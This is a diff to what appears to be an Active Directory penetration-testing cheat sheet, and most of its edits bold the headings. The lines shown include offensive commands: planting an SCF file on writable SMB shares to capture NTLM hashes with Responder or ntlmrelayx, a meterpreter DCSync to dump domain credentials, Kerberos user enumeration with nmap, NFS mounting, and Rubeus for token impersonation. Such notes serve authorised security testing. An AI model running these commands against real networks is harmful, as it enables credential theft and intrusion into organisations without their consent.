@@ -48,7 +48,7 @@ enum4linux -a <target>
 
 ### Open shares \(SMB, NFS, FTP, etc\)
 
-SMB readable shares
+**SMB readable shares**
 
 ```bash
 # ManSpider
@@ -73,9 +73,9 @@ smbclient -L //<target> -U '<domain>\<user>`
 
 ```
 
-SMB writable shares
+**SMB writable shares**
 
-- upload @<scf_name>.scf file => Responder/NTLMrelayx
+upload this @scf_filename.scf and listen for the hash with Responder/NTLMrelayx
 
 > Note: add a @ at first letter of the filename will place the .scf file on the top of the shared folder
 
@@ -88,7 +88,7 @@ Command=ToggleDesktop
 ```
 
 
-NFS 
+**NFS**
 
 ```bash
 showmount -e <target>
@@ -97,7 +97,7 @@ mount <target>:/home/xx /mnt/yy
 
 ---
 
-## ACLs
+## **ACLs**
 
 Get ACL
 
@@ -117,7 +117,7 @@ dump ntds
 meterpreter > dcsync_ntlm <DOMAIN>\<user>
 ```
 
-## Kerbrute AS-REP
+## **Kerbrute AS-REP**
 
 ```bash
 nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/users.txt <target>
@@ -126,7 +126,8 @@ nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>
 
 ---
 
-## Impersonation Token 
+
+## **Impersonation Token**
 
 ### Tools
 - [Rubeus.exe](https://github.com/GhostPack/Rubeus) (DOTNET CSHARP)
